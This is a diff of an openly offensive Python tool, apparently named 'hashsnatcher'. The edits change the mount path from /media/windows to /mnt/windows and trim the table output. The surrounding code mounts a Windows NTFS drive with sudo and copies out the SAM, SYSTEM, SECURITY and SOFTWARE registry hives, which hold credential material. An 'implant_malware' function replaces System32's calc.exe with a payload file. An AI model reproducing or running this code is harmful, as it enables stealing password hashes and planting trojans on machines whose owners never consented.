@@ -55,18 +55,18 @@ def mount_drive(drive):
     # to exploit different file systems got rid of /etc/services 
     # from mount command. Don't think I need it
     try:
-        os.mkdir('/media/windows')
-        print('/media/windows has been created for you, and will'
+        os.mkdir('/mnt/windows')
+        print('/mnt/windows has been created for you, and will'
                 ' be used as a mounting point')
     except PermissionError:
         print('was unable to create mountpoint. Please run '
                 'hashsnatcher as root.')
         sys.exit()
     except FileExistsError:
-        print('/media/windows exists, and will be used as a '
+        print('/mnt/windows exists, and will be used as a '
                 'mounting point')
     subprocess.Popen('sudo mount -t ntfs-3g -o nls=utf8 {} '
-            '/media/windows'.format(drive.get_source()), shell=True)
+            '/mnt/windows'.format(drive.get_source()), shell=True)
     time.sleep(1)
 
 def copy_winpayload():
@@ -80,24 +80,24 @@ def copy_winpayload():
     os.mkdir(directory) 
 
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/sam', 
+        shutil.copyfile('/mnt/windows/Windows/System32/config/sam', 
                 '{}/sam'.format(directory))
     except FileNotFoundError as e:
         print('sam not found')
 
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/system',
+        shutil.copyfile('/mnt/windows/Windows/System32/config/system',
                 '{}/system'.format(directory))
     except FileNotFoundError as e:
         print('system not found')
 
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/security', 
+        shutil.copyfile('/mnt/windows/Windows/System32/config/security', 
                 '{}/security'.format(directory))
     except FileNotFoundError as e:
         print('security not found')
     try:
-        shutil.copyfile('/media/windows/Windows/System32/config/software',
+        shutil.copyfile('/mnt/windows/Windows/System32/config/software',
                 '{}/software'.format(directory))
     except FileNotFoundError as e:
         print('software not found')
@@ -108,8 +108,8 @@ def copy_winpayload():
 
     #optimize this...
     time.sleep(1)
-    subprocess.Popen('sudo umount /media/windows', shell=True)
-    print('Drive has been unmounted from /media/windows')
+    subprocess.Popen('sudo umount /mnt/windows', shell=True)
+    print('Drive has been unmounted from /mnt/windows')
 
 def store_drives(raw_drives):
     # takes as input raw_drives from the blkid command
@@ -148,7 +148,7 @@ def check_for_windrives(raw_drives):
                 '===============\nplease choose a drive to exploit.'
                 ' Note drives start at 0\n\nDrive ')
         print('****************************************************'
-                '*****************************************')
+                '****')
         print('Targeting: ' + raw_win_drives[int(target)])
         mount_drive(win_drives[int(target)])
         return True
@@ -157,15 +157,15 @@ def implant_malware():
     try:
         # I need to implemnt something instead of hardcoding 
         # /media/windows
-        shutil.copyfile('/media/windows/Windows/System32/calc.exe', 
-                '/media/windows/Windows/System32/calc.exe.bak')
+        shutil.copyfile('/mnt/windows/Windows/System32/calc.exe', 
+                '/mnt/windows/Windows/System32/calc.exe.bak')
         shutil.copyfile('/calc.exe', 
-                '/media/windows/Windows/System32/')
+                '/mnt/windows/Windows/System32/')
         print('[*] payload has been uploaded to the host')
     except FileNotFoundError:
         print('drive not exploitable')
 
-    subprocess.Popen('sudo umount /media/windows', shell=True)
+    subprocess.Popen('sudo umount /mnt/windows', shell=True)
 
 
 
@@ -177,29 +177,29 @@ def pretty_print(drives):
     # out useful data about the given drive.
 
     subprocess.call('cat assets/ascii_art', shell=True)
-    print('\n\n\t\t\t    *****************************************'
-            '****************************************************',
+    print('\n\n*******************************'
+            '*********************************',
             end ='')
-    print('\n\t\t\t    ***********************************A TABLE'
-            ' OF ALL CONNECTED DEVICES**************************',
+    print('\n***************A TABLE'
+            ' OF ALL CONNECTED DEVICES*****************',
             end ='')
-    print('\n\t\t\t    *******************************************'
-            '**************************************************',
+    print('\n*********************************'
+            '*******************************',
             end ='')
-    print('\n\t\t\t    *\t\tDrive Location\t\t\t  File System\t\t\t'
-            'Mounted\t\t*',end ='')
+    print('\n Drive Location\t File System\t '
+            '\t Mounted  ',end ='')
     for drive in drives:
         if len(drive.get_fs()) > 6:
-            print('\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   '
-                    '{}\t\t*'.format(drive.get_source(), 
+            print('\n {}\t {}\t '
+                    '\t {}\t'.format(drive.get_source(), 
                         drive.get_fs(), drive.is_mounted()), end='')
         elif len(drive.get_fs()) == 4:
-            print('\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t\t  '
-                    ' {}\t\t*'.format(drive.get_source(), 
+            print('\n {}\t {}  '
+                    '{} '.format(drive.get_source(), 
                         drive.get_fs(),
                         drive.is_mounted()), end='')
-    print('\n\t\t\t    *******************************************'
-            '**************************************************',
+    print('\n**********************************'
+            '*******************************',
             end ='\n')
 
 
